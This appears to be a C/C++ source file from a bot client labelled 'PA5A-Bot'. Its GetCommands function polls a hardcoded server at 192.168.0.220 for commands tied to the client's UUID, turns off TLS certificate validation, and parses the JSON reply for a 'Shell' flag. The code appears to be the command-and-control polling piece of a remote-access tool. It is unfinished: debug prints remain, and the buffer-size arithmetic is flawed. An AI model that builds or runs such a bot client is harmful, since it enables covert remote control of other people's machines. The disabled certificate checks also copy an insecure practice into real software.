#include "pa5a.hpp"

EXTERN_C_START

VOID GenerateBoundary(LPSTR buffer, SIZE_T size)
{
	char chaine[] = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	int max = strlen(chaine);
	int i = 0;

	for (i = 0; i < size; i++)
		buffer[i] = chaine[rand() % (max - 1)];

	buffer[i] = 0;
}

/********************************************************************************************************************************************************/
BOOL GetCommands(struct CommandsToExecute* commandsToExecute)
{
	CHAR boundary[100] = { 0 };
	HINTERNET hSession, hConnect, hRequest;
	LPCSTR acceptTypes[] = {"text/*", NULL};
	GenerateBoundary(boundary, sizeof(boundary) - 1);
	char headers[512] = { 0 };
	char data[200000] = { 0 };
	char uuid[256] = { 0 };
	char url[2048] = { 0 };

	//Construction de l'url
	GetUuid(uuid);
	strcat_s(url, sizeof(url), "/api/clients/");
	strcat_s(url, sizeof(url) - strlen("/api/clients/"), uuid);
	strcat_s(url, sizeof(url) - strlen("/api/clients/") - strlen(uuid), "/commands");

	if ((hSession = InternetOpenA("PA5A-Bot", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0)) == NULL)
	{
		return FALSE;
	}
	if ((hConnect = InternetConnectA(hSession, "192.168.0.220", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL)) == NULL)
	{
		InternetCloseHandle(hSession);
		return FALSE;
	}
	if ((hRequest = HttpOpenRequestA(hConnect, "GET", url, NULL, NULL, acceptTypes, INTERNET_FLAG_SECURE, 1)) == NULL)
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}

	DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
	InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

	if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}


	//(Get the header)
	char buffer[4096] = { 0 };
	DWORD size = sizeof(buffer);
	HttpQueryInfoA(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, (LPVOID)buffer, &size, NULL);
	printf("|%s|\n", buffer);
	//(Get the data)
	InternetQueryDataAvailable(hRequest, &size, 0, 0);
	printf("|%d|\n", size);
	ZeroMemory(buffer, sizeof(buffer));
	InternetReadFile(hRequest, (LPVOID)buffer, sizeof(buffer), &size);

	printf("|%s|\n", buffer);


	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hSession);

	cJSON* commandsObject = NULL;
	commandsObject = cJSON_Parse(buffer);

	cJSON* command = NULL;

	command = cJSON_GetObjectItem(commandsObject, "Shell");

	printf("%d\n", cJSON_IsTrue(command));

	return TRUE;
}
/********************************************************************************************************************************************************/

EXTERN_C_END
